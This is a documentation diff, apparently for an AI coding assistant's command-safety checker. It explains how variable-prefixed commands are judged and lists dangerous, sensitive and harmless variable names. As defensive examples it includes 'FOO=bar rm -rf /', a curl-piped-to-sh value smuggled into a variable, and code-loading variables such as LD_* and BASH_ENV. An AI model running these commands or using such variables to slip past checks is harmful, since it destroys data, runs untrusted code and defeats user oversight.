@@ -80,6 +80,25 @@ In PowerShell a statement that starts with `$` is an expression or an assignment
 
 Brace expansion (`{git,push}`) and `$IFS` in bash, zsh and sh are still refused, because they build a program name out of pieces the check cannot read. PowerShell and cmd have neither, so a script block such as `{ $_.Id -in 1,2 }` is not refused there. Turn the check off with the built-in rule `refuse-dangerous-commands`.
 
+## Environment variables set in front of a command
+
+`FOO=bar git status`, `env FOO=bar git status`, `$env:FOO = 'x'; git status` and `set FOO=bar&& git status` set a variable for the command that follows. Every rule still sees the program after the assignments, so `FOO=1 git reset --hard`, `GIT_DIR=x git push --force` and `FOO=bar rm -rf /` meet the same rules as the command without the prefix, and a deny rule on `git push*` refuses `env -u X FOO=1 git push`. A command with an assignment is never treated as read-only.
+
+Some variables change what a command does, so the name decides:
+
+| Kind      | Names                                                                                                                                                                                                                                                                             | What happens                                                                  |
+| --------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
+| Dangerous | They load code, run a program or decide which program a name means: `PATH`, `LD_*`, `DYLD_*`, `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `PS4`, `IFS`, `SHELLOPTS`, `GIT_*` (except the harmless ones), `NODE_OPTIONS`, `NODE_PATH`, `PYTHON*`, `RUBYOPT`, `PERL5OPT`, `JAVA_TOOL_OPTIONS`, `npm_config_*`, `PIP_*`, `CARGO_*`, `EDITOR`, `PAGER`, `HOME`, `XDG_CONFIG_HOME`, `COMSPEC`, `PSModulePath`, and names ending in `_OPTIONS`, `_OPTS`, `OPT`, `_PATH`, `_COMMAND`, `_WRAPPER`, `_ASKPASS` | Asks at every level, YOLO included. An allow rule does not change it.         |
+| Sensitive | They point a tool at another server, certificate store or temp folder, or hold a credential: `*_PROXY`, `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, `AWS_*`, `AZURE_*`, `KUBECONFIG`, `TMPDIR`, `TEMP`, `TMP`, and names like `API_KEY` or `*_TOKEN`                         | Asks at Cautious, Automatic and Permissive. YOLO runs it.                     |
+| Harmless  | `CI`, `FORCE_COLOR`, `NO_COLOR`, `LANG`, `LC_*`, `TZ`, `DEBUG`, `NODE_ENV`, `GIT_TERMINAL_PROMPT`, `PYTHONUNBUFFERED`                                                                                                                                                              | Nothing extra.                                                                |
+| Unknown   | any other name                                                                                                                                                                                                                                                                    | Nothing extra: `FOO=bar npm test` does not ask. It is still not read-only.    |
+
+The value matters in one case: a value that runs code (`FOO=$(curl x | sh) cmd`, a backtick) asks at every level for any name, because the code runs whatever the variable is called. `PATH` asks whatever its value, because no value proves which program a name will run without reading the disk. `IFS= read -r line` is not asked about: there `IFS` is set for the builtin, not for a program.
+
+In the prompt the reason names the variable and never its value. The command shown in a prompt or a refusal has the value of a variable named like a secret (`API_KEY`, `GITHUB_TOKEN`, `AWS_*`) or shaped like a credential replaced with `«masked:secret-variable»`, and the audit trail masks it the same way.
+
+The lists are built in. The engine accepts a list of names to add and a list to allow, but only from the person's own settings and never from a workspace file or an assistant, and no config key feeds it yet. The checks switch off with the built-in rule `refuse-dangerous-commands`.
+
 ## Shell dialects
 
 A command means what its shell makes of it. In bash, zsh and sh a backtick or `$(...)` runs a command and `<(...)` is a process substitution. In PowerShell a backtick is the escape character (`` `n ``, `` `$x ``), `$(...)` and `@(...)` are subexpressions, and `<(...)` is nothing. cmd has no substitution, but `for /f %i in ('...')` runs one. Single quotes keep all of it as text in POSIX shells and PowerShell, `\$(` is text in a POSIX shell, and `$((1+2))` is arithmetic.
